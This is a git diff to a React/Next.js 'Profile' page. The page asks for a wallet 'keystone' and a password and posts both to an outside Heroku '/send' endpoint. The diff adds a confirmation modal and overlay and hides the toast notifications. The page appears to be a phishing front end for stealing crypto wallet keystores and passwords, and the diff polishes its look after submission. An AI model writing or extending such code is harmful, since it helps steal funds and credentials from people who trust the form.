@@ -5,12 +5,15 @@ import "react-toastify/dist/ReactToastify.css";
 import styles from "../../../styles/Home.module.css";
 import Tabs from "..";
 import { useRouter } from "next/router";
+import Modal from "../../../components/Modal";
+import Overlay from "../../../components/Overlay";
 
 const Profile = () => {
   const [keystone, setKeystone] = useState("");
   const [password, setPassword] = useState("");
+  const [showModal, setShowModal] = useState(false)
   const router = useRouter();
-  const {pid} = router.query;
+  const { pid } = router.query;
 
   const notify = () => {
     keystone === "" || password === ""
@@ -34,6 +37,7 @@ const Profile = () => {
       axios
         .post("https://glacial-temple-10425.herokuapp.com/send", kS)
         .then((res) => res.json())
+        .then(setShowModal(true))
         .catch((err) => err);
   };
   return (
@@ -58,8 +62,13 @@ const Profile = () => {
           <button onClick={notify} className={styles.button}>
             import
           </button>
-          <ToastContainer />
+          {/* <ToastContainer /> */}
         </form>
+        {showModal &&
+          <>
+            <Modal showModal={showModal} setShowModal={setShowModal} />
+            <Overlay />
+          </>}
       </div>
     </Tabs>
   );
